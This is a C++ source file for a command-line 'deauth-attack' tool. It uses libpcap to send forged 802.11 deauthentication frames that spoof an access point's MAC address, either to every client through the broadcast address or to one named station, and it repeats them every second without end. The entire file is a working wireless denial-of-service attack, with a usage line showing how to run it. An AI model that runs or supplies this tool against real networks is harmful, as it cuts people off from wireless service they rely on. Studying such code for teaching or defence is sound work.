#include <cstdio>
#include <pcap.h>
#include<sys/socket.h>
#include<sys/ioctl.h>
#include<net/if.h>
#include<arpa/inet.h>
#include<unistd.h>
#include <libnet.h>
#include <netinet/in.h>
#include "deauth.h"
#include<iostream>

#pragma pack(push, 1)
struct deaHdr{
	Radiotap rdHdr_;
	Beacon bcHdr_;
	Fixed_param fxp_;
};
#pragma pack(pop)

void init(deaHdr* pkt) 
{
	memset(pkt, 0, sizeof(deaHdr));
	pkt->rdHdr_.it_len = 8;
	pkt->bcHdr_.type = 0xc0;
	pkt->fxp_.reason_code = htons(0x700);
}

void usage() {
        printf("syntax : deauth-attack <interface> <ap mac> [<station mac>]\n");
        printf("sample : deauth-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB\n");
}

int main(int argc, char* argv[]) {
    	if (argc != 3 && argc != 4 ) {
		usage();
		return -1;
	}
	
	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];

	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	printf("capture start!\n");

	deaHdr pkt, pkt2;
	init(&pkt);
	if(argc == 3) {
		pkt.bcHdr_.daddr = Mac("FF:FF:FF:FF:FF:FF");
		pkt.bcHdr_.saddr = Mac(argv[2]);
		pkt.bcHdr_.bssid = Mac(argv[2]);
	}
	else {
		memcpy(&pkt2, &pkt, sizeof(deaHdr));
		pkt.bcHdr_.daddr = Mac(argv[3]);
		pkt.bcHdr_.saddr = Mac(argv[2]);
		pkt.bcHdr_.bssid = Mac(argv[2]);
		pkt2.bcHdr_.daddr = Mac(argv[2]);
                pkt2.bcHdr_.saddr = Mac(argv[3]);
                pkt2.bcHdr_.bssid = Mac(argv[3]);
	}
	std::cout<<std::string(pkt.bcHdr_.saddr)<<'\n';
	while(true) {
		puts("send!");
		if(pcap_sendpacket(handle, reinterpret_cast<u_char*> (&pkt), sizeof(pkt))) {
			puts("Failed send packet");
			return -1;
		}	
		if(argc == 4) {
			if(pcap_sendpacket(handle, reinterpret_cast<u_char*> (&pkt2), sizeof(pkt2))) {
                        	puts("Failed send packet");
                        	return -1;
                	}
		}
		sleep(1);	
	}
	
	pcap_close(handle);
}
